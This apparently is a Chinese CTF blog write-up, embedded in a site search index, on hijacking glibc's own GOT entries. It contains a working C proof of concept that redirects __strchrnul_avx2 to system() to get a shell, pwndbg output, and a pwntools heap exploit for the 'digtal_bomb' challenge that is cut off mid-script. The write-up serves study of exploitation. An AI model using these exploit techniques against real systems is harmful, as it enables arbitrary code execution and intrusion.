<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于libc-got hijack</title>
      <link href="/2025/10/10/%E5%85%B3%E4%BA%8Elibc-got-hijack/"/>
      <url>/2025/10/10/%E5%85%B3%E4%BA%8Elibc-got-hijack/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>在湾区杯2025的题目 digtal_bomb 中，除了复现过的<code>house of cat</code>打法，还有另一种打法：<code>libc-got hijack</code>，学习一下<br>参考博客</p><ul><li><a href="https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/">https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/</a></li><li><a href="https://github.com/n132/Libc-GOT-Hijacking">https://github.com/n132/Libc-GOT-Hijacking</a></li></ul><h2 id="0x01-libc-got"><a href="#0x01-libc-got" class="headerlink" title="0x01 libc-got"></a>0x01 libc-got</h2><p>关于<code>got</code>表和<code>plt</code>表的组合机制我们已经了解，其在可执行文件的作用往往就是解析<code>libc</code>函数的加载地址，然而，<code>libc</code>共享库文件本身也是存在<code>got</code>表和<code>plt</code>表的<br>就以<code>Ubuntu GLIBC 2.35-0ubuntu3.11</code>来调试；这里有一个小插曲：我们使用 gdb 调试<code>libc.so.6</code>时候，发现运行会有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/r3t2/ctf/pwn_demos/libc-got/libc.so.6</span><br><span class="line">warning: Unable to find libthread_db matching inferior&#x27;s thread library, thread debugging will not be available.</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.11) stable release version 2.35.</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 11.4.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC ABSOLUTE</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br><span class="line">[Inferior 1 (process 96401) exited normally]</span><br></pre></td></tr></table></figure><p>会输出预置的版本等信息，我们知道输出肯定会走<code>write</code>调用的，我们在<code>write</code>下个断点就可以查看其<code>got</code>表和<code>plt</code>表了（<del>直接用ida看也可以</del>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/r3t2/ctf/pwn_demos/libc-got/libc.so.6:</span><br><span class="line">GOT protection: Partial RELRO | Found 54 GOT entries passing the filter</span><br><span class="line">[0x55555576e018] *ABS*+0xa8720 -&gt; 0x5555556f19e0 (__strnlen_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e020] *ABS*+0xaaf80 -&gt; 0x5555556ed610 (__rawmemchr_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e028] realloc@@GLIBC_2.2.5 -&gt; 0x55555557c030 ◂— endbr64</span><br><span class="line">[0x55555576e030] *ABS*+0xa9ac0 -&gt; 0x5555556ef830 (__strncasecmp_avx) ◂— endbr64</span><br><span class="line">[0x55555576e038] _dl_exception_create@GLIBC_PRIVATE -&gt; 0x55555557c050 ◂— endbr64</span><br><span class="line">[0x55555576e040] *ABS*+0xa97d0 -&gt; 0x5555556f4800 (__mempcpy_avx_unaligned_erms) ◂— endbr64</span><br><span class="line">[0x55555576e048] *ABS*+0xc5b00 -&gt; 0x5555556f4f50 (__wmemset_avx2_unaligned) ◂— endbr64</span><br><span class="line">[0x55555576e050] calloc@@GLIBC_2.2.5 -&gt; 0x55555557c080 ◂— endbr64</span><br><span class="line">[0x55555576e058] *ABS*+0xa8b00 -&gt; 0x5555556ec870 (__strspn_sse42) ◂— endbr64</span><br><span class="line">[0x55555576e060] *ABS*+0xa93f0 -&gt; 0x5555556ed340 (__memchr_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e068] *ABS*+0xa95a0 -&gt; 0x5555556f4840 (__memmove_avx_unaligned_erms) ◂— endbr64</span><br><span class="line">[0x55555576e070] *ABS*+0xc59b0 -&gt; 0x5555556f5540 (__wmemchr_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e078] *ABS*+0xa9950 -&gt; 0x5555556f3a20 (__stpcpy_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e080] *ABS*+0xc5a40 -&gt; 0x5555556f5140 (__wmemcmp_avx2_movbe) ◂— endbr64</span><br><span class="line">[0x55555576e088] _dl_find_dso_for_object@GLIBC_PRIVATE -&gt; 0x55555557c0f0 ◂— endbr64</span><br><span class="line">[0x55555576e090] *ABS*+0xa88d0 -&gt; 0x5555556f30c0 (__strncpy_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e098] *ABS*+0xa86a0 -&gt; 0x5555556f1860 (__strlen_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e0a0] *ABS*+0xa9b10 -&gt; 0x5555556ee1c4 (__strcasecmp_l_avx) ◂— endbr64</span><br><span class="line">[0x55555576e0a8] *ABS*+0xa8390 -&gt; 0x5555556f2d30 (__strcpy_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e0b0] *ABS*+0xc5370 -&gt; 0x5555556f61c0 (__wcschr_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e0b8] *ABS*+0xab010 -&gt; 0x5555556f1480 (__strchrnul_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e0c0] *ABS*+0xb1570 -&gt; 0x5555556ed780 (__memrchr_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e0c8] _dl_deallocate_tls@GLIBC_PRIVATE -&gt; 0x55555557c170 ◂— endbr64</span><br><span class="line">[0x55555576e0d0] __tls_get_addr@GLIBC_2.3 -&gt; 0x55555557c180 ◂— endbr64</span><br><span class="line">[0x55555576e0d8] *ABS*+0xc5b00 -&gt; 0x5555556f4f50 (__wmemset_avx2_unaligned) ◂— endbr64</span><br><span class="line">[0x55555576e0e0] *ABS*+0xa9480 -&gt; 0x5555556edb00 (__memcmp_avx2_movbe) ◂— endbr64</span><br><span class="line">[0x55555576e0e8] *ABS*+0xa9b60 -&gt; 0x5555556ef844 (__strncasecmp_l_avx) ◂— endbr64</span><br><span class="line">[0x55555576e0f0] _dl_fatal_printf@GLIBC_PRIVATE -&gt; 0x55555557c1c0 ◂— endbr64</span><br><span class="line">[0x55555576e0f8] *ABS*+0xa81d0 -&gt; 0x5555556f1cb0 (__strcat_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e100] *ABS*+0xc5470 -&gt; 0x5555556e6680 (__wcscpy_ssse3) ◂— endbr64</span><br><span class="line">[0x55555576e108] *ABS*+0xa8420 -&gt; 0x5555556ec610 (__strcspn_sse42) ◂— endbr64</span><br><span class="line">[0x55555576e110] *ABS*+0xa9a70 -&gt; 0x5555556ee1b0 (__strcasecmp_avx) ◂— endbr64</span><br><span class="line">[0x55555576e118] *ABS*+0xa8830 -&gt; 0x5555556ece00 (__strncmp_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e120] *ABS*+0xc59b0 -&gt; 0x5555556f5540 (__wmemchr_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e128] *ABS*+0xa99e0 -&gt; 0x5555556f3dd0 (__stpncpy_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e130] *ABS*+0xc53f0 -&gt; 0x5555556f5830 (__wcscmp_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e138] _dl_audit_symbind_alt@GLIBC_PRIVATE -&gt; 0x55555557c250 ◂— endbr64</span><br><span class="line">[0x55555576e140] *ABS*+0xa95a0 -&gt; 0x5555556f4840 (__memmove_avx_unaligned_erms) ◂— endbr64</span><br><span class="line">[0x55555576e148] *ABS*+0xa8960 -&gt; 0x5555556f1690 (__strrchr_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e150] *ABS*+0xa8260 -&gt; 0x5555556f1200 (__strchr_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e158] *ABS*+0xc5370 -&gt; 0x5555556f61c0 (__wcschr_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e160] *ABS*+0xa9c10 -&gt; 0x5555556f4840 (__memmove_avx_unaligned_erms) ◂— endbr64</span><br><span class="line">[0x55555576e168] _dl_rtld_di_serinfo@GLIBC_PRIVATE -&gt; 0x55555557c2b0 ◂— endbr64</span><br><span class="line">[0x55555576e170] _dl_allocate_tls@GLIBC_PRIVATE -&gt; 0x55555557c2c0 ◂— endbr64</span><br><span class="line">[0x55555576e178] __tunable_get_val@GLIBC_PRIVATE -&gt; 0x7ffff7fdad70 (__tunable_get_val) ◂— endbr64</span><br><span class="line">[0x55555576e180] *ABS*+0xc5540 -&gt; 0x5555556f6640 (__wcslen_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e188] *ABS*+0xa96d0 -&gt; 0x5555556f5000 (__memset_avx2_unaligned_erms) ◂— endbr64</span><br><span class="line">[0x55555576e190] *ABS*+0xc6cd0 -&gt; 0x5555556f6840 (__wcsnlen_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e198] *ABS*+0xa82e0 -&gt; 0x5555556ec9c0 (__strcmp_avx2) ◂— endbr64</span><br><span class="line">[0x55555576e1a0] _dl_allocate_tls_init@GLIBC_PRIVATE -&gt; 0x55555557c320 ◂— endbr64</span><br><span class="line">[0x55555576e1a8] __nptl_change_stack_perm@GLIBC_PRIVATE -&gt; 0x55555557c330 ◂— endbr64</span><br><span class="line">[0x55555576e1b0] *ABS*+0xa89e0 -&gt; 0x5555556ec750 (__strpbrk_sse42) ◂— endbr64</span><br><span class="line">[0x55555576e1b8] _dl_audit_preinit@GLIBC_PRIVATE -&gt; 0x55555557c350 ◂— endbr64</span><br><span class="line">[0x55555576e1c0] *ABS*+0xa8720 -&gt; 0x5555556f19e0 (__strnlen_avx2) ◂— endbr64</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; plt</span><br><span class="line">Section .plt 0x55555557c000 - 0x55555557c370:</span><br><span class="line">No symbols found in section .plt</span><br><span class="line">Section .plt.got 0x55555557c370 - 0x55555557c390:</span><br><span class="line">0x55555557c370: free@plt</span><br><span class="line">0x55555557c380: malloc@plt</span><br><span class="line">Section .plt.sec 0x55555557c390 - 0x55555557c6f0:</span><br><span class="line">0x55555557c3b0: realloc@plt</span><br><span class="line">0x55555557c3d0: _dl_exception_create@plt</span><br><span class="line">0x55555557c400: calloc@plt</span><br><span class="line">0x55555557c470: _dl_find_dso_for_object@plt</span><br><span class="line">0x55555557c4f0: _dl_deallocate_tls@plt</span><br><span class="line">0x55555557c500: __tls_get_addr@plt</span><br><span class="line">0x55555557c540: _dl_fatal_printf@plt</span><br><span class="line">0x55555557c5d0: _dl_audit_symbind_alt@plt</span><br><span class="line">0x55555557c630: _dl_rtld_di_serinfo@plt</span><br><span class="line">0x55555557c640: _dl_allocate_tls@plt</span><br><span class="line">0x55555557c650: __tunable_get_val@plt</span><br><span class="line">0x55555557c6a0: _dl_allocate_tls_init@plt</span><br><span class="line">0x55555557c6b0: __nptl_change_stack_perm@plt</span><br><span class="line">0x55555557c6d0: _dl_audit_preinit@plt</span><br></pre></td></tr></table></figure><p>表项大致可以分为几类：</p><ul><li><code>avx/sse</code> 后缀的不同优化版本的函数</li><li>对动态链接器 <code>ld-linux-x86-64.so.2</code> 中函数的调用（如<code>_dl_xxx</code>）</li><li><code>calloc</code>，<code>realloc</code>，<code>__tunable_get_val</code>等公共符号</li></ul><p>对于第一类，<code>libc</code>初始化时会根据 cpu 来确定<code>strlen</code>，<code>memcpy</code>，<code>memset</code>等基础函数的合适优化版本来重定向；第二类则是类似我们的程序对<code>libc</code>中函数调用，<code>libc</code>对<code>ld</code>中的函数调用也走<code>got</code>表；第三类则是对外的公开接口，需要动态的可重定向性质</p><h2 id="0x02-libc-got-hijack"><a href="#0x02-libc-got-hijack" class="headerlink" title="0x02 libc-got hijack"></a>0x02 libc-got hijack</h2><p>既然<code>libc</code>中也有<code>got</code>，那么<code>got hijack</code>是否也可以运用于<code>libc</code>中呢？当然可以，PoC如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">915</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 偏移常量根据版本调整 */</span></span><br><span class="line">    <span class="type">uintptr_t</span> system_addr = (<span class="type">uintptr_t</span>)(<span class="type">void</span>*)system;</span><br><span class="line">    <span class="type">uintptr_t</span> libc_base  = system_addr - <span class="number">0x50d70</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* __strchrnul_avx2的got表地址 */</span></span><br><span class="line">    <span class="type">uintptr_t</span> target = libc_base + <span class="number">0x21a0b8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 覆写 GOT 条目为 system 的地址 */</span></span><br><span class="line">    *(<span class="type">uintptr_t</span>*)target = system_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 触发 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ubuntu GLIBC 2.35-0ubuntu3.11</span></span><br><span class="line"><span class="comment">// gcc poc.c -o poc</span></span><br></pre></td></tr></table></figure><p><code>printf</code>函数会调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff7c750dd &lt;__vfprintf_internal+173&gt;    call   *ABS*+0xab010@plt           &lt;*ABS*+0xab010@plt&gt;</span><br><span class="line">       rdi: 0x555555556004 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br><span class="line">       rsi: 0x25</span><br><span class="line">       rdx: 0x7fffffffc9d0 ◂— 0x3000000008</span><br><span class="line">       rcx: 0</span><br></pre></td></tr></table></figure><p>这里<code>*ABS*+0xab010@plt</code>是哪一项呢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0x55555576e0b8] *ABS*+0xab010 -&gt; 0x5555556f1480 (__strchrnul_avx2) ◂— endbr64</span><br></pre></td></tr></table></figure><p>正是<code>__strchrnul_avx2</code>，我们已经将其<code>got</code>表项覆盖为了<code>system</code>地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; s</span><br><span class="line">__libc_system (line=0x555555556004 &quot;/bin/sh&quot;) at ../sysdeps/posix/system.c:201</span><br></pre></td></tr></table></figure><p>最后效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> ── r3t2@LAPTOP-6JKPOVPE:~/ctf/pwn_demos/libc-got</span><br><span class="line">│ 17:00:46</span><br><span class="line"> ── $ ./poc</span><br><span class="line">$ whoami</span><br><span class="line">r3t2</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h2 id="0x03-湾区杯2025-digtal-bomb"><a href="#0x03-湾区杯2025-digtal-bomb" class="headerlink" title="0x03 湾区杯2025 digtal_bomb"></a>0x03 湾区杯2025 digtal_bomb</h2><p>#todo<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;digtal_bomb_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6_2.35-0ubuntu3.10_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *$rebase(0x19d6)</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6-dbg_2.35-0ubuntu3.10_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/glibc-source_2.35-0ubuntu3.10_all/usr/src/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line">p = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p, gdbscript=gs)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice &gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index &gt;&gt; \n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size &gt;&gt; \n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice &gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index &gt;&gt; \n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice &gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index &gt;&gt; \n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">f&quot;Show at index <span class="subst">&#123;index&#125;</span>:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice &gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index &gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 1: go into the heap system</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Enter min (0-500): &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Enter max (0-500): &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">101</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your guess :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">101</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 2 leak heap base</span></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x500</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x601</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x4f0</span>, <span class="string">b&#x27;X&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x500</span>, <span class="string">b&#x27;Y&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x4f0</span>, <span class="string">b&#x27;Z&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x500</span>, <span class="string">b&#x27;P&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">marker = <span class="string">b&#x27;K&#x27;</span>*<span class="number">8</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">edit(<span class="number">9</span>, marker)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(marker)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line">log.success(<span class="string">f&quot;heap base: <span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">10</span>]:</span><br><span class="line">    delete(i)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 3 leak libc base</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">forged_fd = heap_base + <span 